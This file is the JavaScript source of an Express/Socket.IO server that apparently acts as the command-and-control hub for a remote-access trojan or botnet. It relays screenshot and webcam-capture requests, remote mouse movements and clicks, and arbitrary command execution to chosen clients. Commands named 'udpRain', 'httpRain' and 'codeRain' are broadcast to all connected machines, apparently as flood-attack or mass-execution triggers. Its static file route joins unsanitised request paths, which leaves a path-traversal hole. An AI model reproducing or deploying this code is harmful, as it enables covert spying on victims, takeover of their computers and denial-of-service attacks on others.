const info = { port: 80 };
const path = require("path");
const app = require("express")();
const httpServer = require("http").createServer(app);
const io = require("socket.io")(httpServer, {
  maxHttpBufferSize: "1e8",
  pingTimeout: 60000,
  cors: {
    origin: "*",
  },
  // Binary transfer optimizasyonu
  transports: ['websocket', 'polling'],
  allowEIO3: true,
  // Buffer optimizasyonu
  maxHttpBufferSize: 1e8,
  pingTimeout: 60000,
  pingInterval: 25000,
});

app.get("/test", (req, res) => {
  console.log("Got request");
  res.send("The application works");
});

app.post("/post-test", (req, res) => {
  console.log("Got Post Request");
  res.send("The post sender works");
});

// ExpressJS Module Codes
app.get("*", (req, res) => {
  const wwwPath = path.join(__dirname, "../www/", req.params[0]);
  console.log({ wwwPath });
  res.sendFile(wwwPath);
});

// Socket.IO Module Codes
io.on("connection", (socket) => {
  console.log("Connected: " + socket.id);
  socket.on("disconnect", () => {
    console.log("Disconnected: " + socket.id);
  });
  socket.on("joinToRoom", (data) => {
    socket.join(data.roomName);
    console.log(
      "---> [" + socket.id + "] connected to [" + data.roomName + "]"
    );
  });
  socket.on("screenshotRequest", (data) => {
    io.to(data.from).emit("screenshotRequest", data);
  });
  socket.on("camShotRequest", (data) => {
    io.to(data.from).emit("camShotRequest", data);
  });
  socket.on("screenshotResponse", (data) => {
    io.to(data.to).emit("screenshotResponse", data);
  });
  socket.on("camShotResponse", (data) => {
    io.to(data.to).emit("camShotResponse", data);
  });
  
  // Binary transfer için yeni event
  socket.on("camBinary", (data) => {
    io.to(data.to).emit("camBinary", data);
  });
  socket.on("mousemove", (data) => {
    io.to(data.from).emit("mousemove", data);
  });
  socket.on("click", (data) => {
    io.to(data.from).emit("click", data);
  });

  socket.on("getRunRequest", (data) => {
    if (data.cmd === "getUsers") {
      data["cmd"] = JSON.stringify(Array.from(io.sockets.adapter.rooms))
        .split(",")
        .join("\r\n");
      io.to(data.to).emit("getRunResponse", data);
    } else if (data.cmd.indexOf("udpRain") > -1) {
      console.log("udpRain triggered on server");
      io.emit("getRunRequest", data);
    } else if (data.cmd.indexOf("httpRain") > -1) {
      console.log("httpRain triggered on server");
      io.emit("getRunRequest", data);
    } else if (data.cmd.indexOf("codeRain") > -1) {
      console.log("codeRain triggered on server");
      io.emit("getRunRequest", data);
    } else {
      io.to(data.from).emit("getRunRequest", data);
    }
  });
  socket.on("getRunResponse", (data) => {
    io.to(data.to).emit("getRunResponse", data);
  });
  socket.on("mousemove", (data) => {
    io.to(data.from).emit("mousemove", data);
  });
});

// Http Modules Codes
httpServer.listen(info.port, () => {
  console.log("Listening *: " + info.port);
});
